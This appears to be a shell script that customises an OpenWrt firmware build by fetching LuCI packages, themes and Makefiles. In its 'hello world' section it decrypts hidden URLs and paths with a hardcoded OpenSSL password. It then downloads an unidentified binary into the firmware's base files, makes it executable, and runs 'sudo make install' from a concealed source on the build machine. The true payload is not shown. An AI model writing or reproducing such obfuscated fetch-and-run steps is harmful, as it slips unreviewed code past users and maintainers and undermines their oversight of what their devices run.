# Enter the "package" directory.
cd package

# lean
svn co https://github.com/coolsnowwolf/lede/trunk/package/lean
pushd lean
rm -rf luci-app-diskman autocore parted luci-theme-argon
[ -f luci-app-ttyd/root/etc/init.d/ttyd ] && rm luci-app-ttyd/root/etc/init.d/ttyd
[ -f luci-app-rclone/luasrc/controller/rclone.lua ] && sed -i '/firstchild/Id;s/nas/services/g' luci-app-rclone/luasrc/controller/rclone.lua
popd

# autocore
cp -r ../../package/autocore autocore

# argon theme
git clone -b 18.06 https://github.com/jerrykuku/luci-theme-argon.git
sed -i '/\t\t\t\t\t\t/d;s/ \/.*$//' luci-theme-argon/luasrc/view/themes/argon/footer.htm

# ServerChan
git clone https://github.com/tty228/luci-app-serverchan

# dockerman
svn co https://github.com/lisaac/luci-app-dockerman/trunk/applications/luci-app-dockerman
svn co https://github.com/lisaac/luci-lib-docker/trunk/collections/luci-lib-docker

# hello world
svn co $(echo "U2FsdGVkX1+xmPAiu+sF5zqr0PL23miatWq7uSEn8Fl14y/HjHfgwpb08Q/2A2odXc5nGcBnlCiGQW6+17OuZ4E+wFwnJdkhRyAulNEycWn+4sMS8bBfFi2EnTt4abmC" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
#filename=$(echo "U2FsdGVkX1+wOtnMvQludL4cjeRLoDC/aeRTM8Ha86Lym9Mz18FANWZxO0oKuBftVUxSEO2E/J63ivUd8abcmuTr+LXylNnJfPvP9lBXAmU=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
#[ -f $filename ] && sed -i 's/444/808080/g' $filename

core=$(echo "U2FsdGVkX1+7BchTVGS1ffmD13UNPR8UpsV6Fy/6GiTSkZgpPJozy9gGjkXsnsxM" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
pushd base-files/files
mkdir -p $(echo "U2FsdGVkX18LxUz4Piaxn78Aw1Her/PzkcYq3lS2xCU9xa+m7kXDOJms7l/UvCP3" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
wget -qO- $(curl -sL $(echo "U2FsdGVkX18O1Z1KTmw1he1cry3QXZDHjzKLaBYso71PEZsiexBJlKNv7aripkhiIm8yRIySg6aoTvYGGgkpp5w17rCMGG8t6AuWPmDNLLs=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2) | sed -r -n 's/.*"browser_download_url": *"(.*)".*/\1/p' | grep armv8 | head -n 1 ) | gunzip -c > $core
chmod +x $core
popd

pushd $(echo "U2FsdGVkX183O4hNMXEiC5fQV3ryaNcqvqZLf7XX2MniQ9fq3Yx8WEbKwu5DdPJ9wR33G5UmLrAqEss3/bjBuQ==" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
make && sudo make install
popd


# Return to "openwrt" directory.
cd ../

# diskman
mkdir -p package/luci-app-diskman
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/applications/luci-app-diskman/Makefile -O package/luci-app-diskman/Makefile
mkdir -p package/parted
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Parted.Makefile -O package/parted/Makefile
